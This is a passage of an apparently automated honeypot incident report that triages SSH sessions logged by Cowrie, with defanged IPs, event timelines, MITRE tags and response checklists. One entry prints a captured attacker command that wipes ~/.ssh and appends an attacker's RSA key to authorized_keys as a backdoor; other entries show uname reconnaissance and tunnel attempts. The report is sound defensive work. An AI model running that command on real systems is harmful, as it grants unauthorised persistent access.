- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b98012da259b

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:54 |
| **Last Seen** | 2026-09-03 11:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:54:34` | `cowrie.session.connect` |
| `2026-09-03 11:54:34` | `cowrie.login.success` |
| `2026-09-03 11:54:35` | `cowrie.session.params` |
| `2026-09-03 11:54:39` | `cowrie.log.closed` |
| `2026-09-03 11:54:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2b4ef75727c

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:54 |
| **Last Seen** | 2026-09-03 11:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:54:35` | `cowrie.session.connect` |
| `2026-09-03 11:54:35` | `cowrie.login.success` |
| `2026-09-03 11:54:35` | `cowrie.session.params` |
| `2026-09-03 11:54:39` | `cowrie.log.closed` |
| `2026-09-03 11:54:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a6c2d30412e

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:54 |
| **Last Seen** | 2026-09-03 11:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:54:39` | `cowrie.session.connect` |
| `2026-09-03 11:54:39` | `cowrie.login.success` |
| `2026-09-03 11:54:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6df61e539bb

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:54 |
| **Last Seen** | 2026-09-03 11:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:54:44` | `cowrie.session.connect` |
| `2026-09-03 11:54:44` | `cowrie.login.success` |
| `2026-09-03 11:54:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42d971433fdf

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:54 |
| **Last Seen** | 2026-09-03 11:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:54:44` | `cowrie.session.connect` |
| `2026-09-03 11:54:44` | `cowrie.login.success` |
| `2026-09-03 11:54:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f93d77d38dc4

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:54 |
| **Last Seen** | 2026-09-03 11:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `From: <sip:nm@nm>;tag=root, To: <sip:nm2@nm2>, Call-ID: 50000, CSeq: 42 OPTIONS, Max-Forwards: 70` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:54:49` | `cowrie.session.connect` |
| `2026-09-03 11:54:49` | `cowrie.login.success` |
| `2026-09-03 11:54:50` | `cowrie.session.params` |
| `2026-09-03 11:54:50` | `cowrie.command.input` |
| `2026-09-03 11:54:50` | `cowrie.command.failed` |
| `2026-09-03 11:54:50` | `cowrie.command.input` |
| `2026-09-03 11:54:50` | `cowrie.command.failed` |
| `2026-09-03 11:54:50` | `cowrie.command.input` |
| `2026-09-03 11:54:50` | `cowrie.command.failed` |
| `2026-09-03 11:54:50` | `cowrie.command.input` |
| `2026-09-03 11:54:50` | `cowrie.command.failed` |
| `2026-09-03 11:54:50` | `cowrie.command.input` |
| `2026-09-03 11:54:50` | `cowrie.command.failed` |
| `2026-09-03 11:54:50` | `cowrie.command.input` |
| `2026-09-03 11:54:50` | `cowrie.command.failed` |
| `2026-09-03 11:54:50` | `cowrie.command.input` |
| `2026-09-03 11:54:50` | `cowrie.command.failed` |
| `2026-09-03 11:54:50` | `cowrie.command.input` |
| `2026-09-03 11:54:50` | `cowrie.command.failed` |
| `2026-09-03 11:54:50` | `cowrie.command.input` |
| `2026-09-03 11:54:57` | `cowrie.log.closed` |
| `2026-09-03 11:54:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcd4bcf2d4b1

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:54 |
| **Last Seen** | 2026-09-03 11:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `From: <sip:nm@nm>;tag=root, To: <sip:nm2@nm2>, Call-ID: 50000, CSeq: 42 OPTIONS, Max-Forwards: 70` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:54:54` | `cowrie.session.connect` |
| `2026-09-03 11:54:54` | `cowrie.login.success` |
| `2026-09-03 11:54:55` | `cowrie.session.params` |
| `2026-09-03 11:54:55` | `cowrie.command.input` |
| `2026-09-03 11:54:55` | `cowrie.command.failed` |
| `2026-09-03 11:54:55` | `cowrie.command.input` |
| `2026-09-03 11:54:55` | `cowrie.command.failed` |
| `2026-09-03 11:54:55` | `cowrie.command.input` |
| `2026-09-03 11:54:55` | `cowrie.command.failed` |
| `2026-09-03 11:54:55` | `cowrie.command.input` |
| `2026-09-03 11:54:55` | `cowrie.command.failed` |
| `2026-09-03 11:54:55` | `cowrie.command.input` |
| `2026-09-03 11:54:55` | `cowrie.command.failed` |
| `2026-09-03 11:54:55` | `cowrie.command.input` |
| `2026-09-03 11:54:55` | `cowrie.command.failed` |
| `2026-09-03 11:54:55` | `cowrie.command.input` |
| `2026-09-03 11:54:55` | `cowrie.command.failed` |
| `2026-09-03 11:54:55` | `cowrie.command.input` |
| `2026-09-03 11:54:55` | `cowrie.command.failed` |
| `2026-09-03 11:54:55` | `cowrie.command.input` |
| `2026-09-03 11:55:02` | `cowrie.log.closed` |
| `2026-09-03 11:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-091502b5a75e

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:54 |
| **Last Seen** | 2026-09-03 11:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `From: <sip:nm@nm>;tag=root, To: <sip:nm2@nm2>, Call-ID: 50000, CSeq: 42 OPTIONS, Max-Forwards: 70` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:54:55` | `cowrie.session.connect` |
| `2026-09-03 11:54:55` | `cowrie.login.success` |
| `2026-09-03 11:54:56` | `cowrie.session.params` |
| `2026-09-03 11:54:56` | `cowrie.command.input` |
| `2026-09-03 11:54:56` | `cowrie.command.failed` |
| `2026-09-03 11:54:56` | `cowrie.command.input` |
| `2026-09-03 11:54:56` | `cowrie.command.failed` |
| `2026-09-03 11:54:56` | `cowrie.command.input` |
| `2026-09-03 11:54:56` | `cowrie.command.failed` |
| `2026-09-03 11:54:56` | `cowrie.command.input` |
| `2026-09-03 11:54:56` | `cowrie.command.failed` |
| `2026-09-03 11:54:56` | `cowrie.command.input` |
| `2026-09-03 11:54:56` | `cowrie.command.failed` |
| `2026-09-03 11:54:56` | `cowrie.command.input` |
| `2026-09-03 11:54:56` | `cowrie.command.failed` |
| `2026-09-03 11:54:56` | `cowrie.command.input` |
| `2026-09-03 11:54:56` | `cowrie.command.failed` |
| `2026-09-03 11:54:56` | `cowrie.command.input` |
| `2026-09-03 11:54:56` | `cowrie.command.failed` |
| `2026-09-03 11:54:56` | `cowrie.command.input` |
| `2026-09-03 11:55:02` | `cowrie.log.closed` |
| `2026-09-03 11:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-808119c3dfed

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 11:55 |
| **Last Seen** | 2026-09-03 11:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:55:00` | `cowrie.session.connect` |
| `2026-09-03 11:55:01` | `cowrie.client.version` |
| `2026-09-03 11:55:01` | `cowrie.client.kex` |
| `2026-09-03 11:55:01` | `cowrie.login.success` |
| `2026-09-03 11:55:02` | `cowrie.session.params` |
| `2026-09-03 11:55:02` | `cowrie.command.input` |
| `2026-09-03 11:55:02` | `cowrie.log.closed` |
| `2026-09-03 11:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5a8b0d1f9df

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:55 |
| **Last Seen** | 2026-09-03 11:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:55:38` | `cowrie.session.connect` |
| `2026-09-03 11:55:38` | `cowrie.login.success` |
| `2026-09-03 11:55:39` | `cowrie.session.params` |
| `2026-09-03 11:55:43` | `cowrie.log.closed` |
| `2026-09-03 11:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02161039acf2

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:55 |
| **Last Seen** | 2026-09-03 11:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:55:43` | `cowrie.session.connect` |
| `2026-09-03 11:55:43` | `cowrie.login.success` |
| `2026-09-03 11:55:43` | `cowrie.session.params` |
| `2026-09-03 11:55:48` | `cowrie.log.closed` |
| `2026-09-03 11:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c65b3197162

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:55 |
| **Last Seen** | 2026-09-03 11:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:55:43` | `cowrie.session.connect` |
| `2026-09-03 11:55:43` | `cowrie.login.success` |
| `2026-09-03 11:55:44` | `cowrie.session.params` |
| `2026-09-03 11:55:48` | `cowrie.log.closed` |
| `2026-09-03 11:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9b9ac735199

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:55 |
| **Last Seen** | 2026-09-03 11:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:55:43` | `cowrie.session.connect` |
| `2026-09-03 11:55:44` | `cowrie.login.success` |
| `2026-09-03 11:55:45` | `cowrie.session.params` |
| `2026-09-03 11:55:45` | `cowrie.command.input` |
| `2026-09-03 11:55:48` | `cowrie.log.closed` |
| `2026-09-03 11:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-514b6408eec3

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:55 |
| **Last Seen** | 2026-09-03 11:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:55:48` | `cowrie.session.connect` |
| `2026-09-03 11:55:48` | `cowrie.login.success` |
| `2026-09-03 11:55:49` | `cowrie.session.params` |
| `2026-09-03 11:55:49` | `cowrie.command.input` |
| `2026-09-03 11:55:53` | `cowrie.log.closed` |
| `2026-09-03 11:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb1382a37097

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:55 |
| **Last Seen** | 2026-09-03 11:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:55:48` | `cowrie.session.connect` |
| `2026-09-03 11:55:49` | `cowrie.login.success` |
| `2026-09-03 11:55:49` | `cowrie.session.params` |
| `2026-09-03 11:55:49` | `cowrie.command.input` |
| `2026-09-03 11:55:53` | `cowrie.log.closed` |
| `2026-09-03 11:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9979fa022c56

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 11:56 |
| **Last Seen** | 2026-09-03 11:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:56:43` | `cowrie.session.connect` |
| `2026-09-03 11:56:43` | `cowrie.client.version` |
| `2026-09-03 11:56:43` | `cowrie.client.kex` |
| `2026-09-03 11:56:43` | `cowrie.login.success` |
| `2026-09-03 11:56:44` | `cowrie.session.params` |
| `2026-09-03 11:56:44` | `cowrie.command.input` |
| `2026-09-03 11:56:44` | `cowrie.log.closed` |
| `2026-09-03 11:56:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0394ebc6bc2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 11:58 |
| **Last Seen** | 2026-09-03 11:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:58:21` | `cowrie.session.connect` |
| `2026-09-03 11:58:21` | `cowrie.client.version` |
| `2026-09-03 11:58:21` | `cowrie.client.kex` |
| `2026-09-03 11:58:21` | `cowrie.login.success` |
| `2026-09-03 11:58:22` | `cowrie.session.params` |
| `2026-09-03 11:58:22` | `cowrie.command.input` |
| `2026-09-03 11:58:22` | `cowrie.log.closed` |
| `2026-09-03 11:58:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b39df532c965

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:00 |
| **Last Seen** | 2026-09-03 12:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:00:01` | `cowrie.session.connect` |
| `2026-09-03 12:00:01` | `cowrie.client.version` |
| `2026-09-03 12:00:01` | `cowrie.client.kex` |
| `2026-09-03 12:00:01` | `cowrie.login.success` |
| `2026-09-03 12:00:02` | `cowrie.session.params` |
| `2026-09-03 12:00:02` | `cowrie.command.input` |
| `2026-09-03 12:00:02` | `cowrie.log.closed` |
| `2026-09-03 12:00:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-664dc8150531

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 12:00 |
| **Last Seen** | 2026-09-03 12:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:00:42` | `cowrie.session.connect` |
| `2026-09-03 12:00:42` | `cowrie.client.version` |
| `2026-09-03 12:00:42` | `cowrie.client.kex` |
| `2026-09-03 12:00:43` | `cowrie.login.success` |
| `2026-09-03 12:00:44` | `cowrie.direct-tcpip.request` |
| `2026-09-03 12:00:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 12:00:44` | `cowrie.direct-tcpip.data` |
| `2026-09-03 12:00:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e752593e3f4b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:01 |
| **Last Seen** | 2026-09-03 12:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:01:40` | `cowrie.session.connect` |
| `2026-09-03 12:01:40` | `cowrie.client.version` |
| `2026-09-03 12:01:40` | `cowrie.client.kex` |
| `2026-09-03 12:01:40` | `cowrie.login.success` |
| `2026-09-03 12:01:41` | `cowrie.session.params` |
| `2026-09-03 12:01:41` | `cowrie.command.input` |
| `2026-09-03 12:01:41` | `cowrie.log.closed` |
| `2026-09-03 12:01:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04ad22597dbf

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 12:02 |
| **Last Seen** | 2026-09-03 12:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:02:22` | `cowrie.session.connect` |
| `2026-09-03 12:02:22` | `cowrie.client.version` |
| `2026-09-03 12:02:22` | `cowrie.client.kex` |
| `2026-09-03 12:02:23` | `cowrie.login.success` |
| `2026-09-03 12:02:23` | `cowrie.direct-tcpip.request` |
| `2026-09-03 12:02:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 12:02:24` | `cowrie.direct-tcpip.data` |
| `2026-09-03 12:02:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-389ba1185052

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:03 |
| **Last Seen** | 2026-09-03 12:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:03:15` | `cowrie.session.connect` |
| `2026-09-03 12:03:15` | `cowrie.client.version` |
| `2026-09-03 12:03:15` | `cowrie.client.kex` |
| `2026-09-03 12:03:16` | `cowrie.login.success` |
| `2026-09-03 12:03:16` | `cowrie.session.params` |
| `2026-09-03 12:03:16` | `cowrie.command.input` |
| `2026-09-03 12:03:17` | `cowrie.log.closed` |
| `2026-09-03 12:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fd8962ec4e9

| Field | Detail |
|---|---|
| **Source IP** | `136.248.242[.]166` |
| **First Seen** | 2026-09-03 12:04 |
| **Last Seen** | 2026-09-03 12:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:04:44` | `cowrie.session.connect` |
| `2026-09-03 12:04:44` | `cowrie.client.version` |
| `2026-09-03 12:04:44` | `cowrie.client.kex` |
| `2026-09-03 12:04:45` | `cowrie.login.success` |
| `2026-09-03 12:04:46` | `cowrie.session.params` |
| `2026-09-03 12:04:46` | `cowrie.command.input` |
| `2026-09-03 12:04:46` | `cowrie.command.failed` |
| `2026-09-03 12:04:46` | `cowrie.log.closed` |
| `2026-09-03 12:04:46` | `cowrie.session.params` |
| `2026-09-03 12:04:46` | `cowrie.command.input` |
| `2026-09-03 12:04:47` | `cowrie.session.file_download` |
| `2026-09-03 12:04:47` | `cowrie.log.closed` |
| `2026-09-03 12:04:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.248.242[.]166` to AbuseIPDB if not already reported
- [ ] Block `136.248.242[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23edfaee396e

| Field | Detail |
|---|---|
| **Source IP** | `136.248.242[.]166` |
| **First Seen** | 2026-09-03 12:04 |
| **Last Seen** | 2026-09-03 12:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:04:47` | `cowrie.session.connect` |
| `2026-09-03 12:04:47` | `cowrie.client.version` |
| `2026-09-03 12:04:47` | `cowrie.client.kex` |
| `2026-09-03 12:04:47` | `cowrie.login.success` |
| `2026-09-03 12:04:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.248.242[.]166` to AbuseIPDB if not already reported
- [ ] Block `136.248.242[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c9c6c92191f

| Field | Detail |
|---|---|
| **Source IP** | `136.248.242[.]166` |
| **First Seen** | 2026-09-03 12:04 |
| **Last Seen** | 2026-09-03 12:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:04:48` | `cowrie.session.connect` |
| `2026-09-03 12:04:48` | `cowrie.client.version` |
| `2026-09-03 12:04:48` | `cowrie.client.kex` |
| `2026-09-03 12:04:48` | `cowrie.login.success` |
| `2026-09-03 12:04:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.248.242[.]166` to AbuseIPDB if not already reported
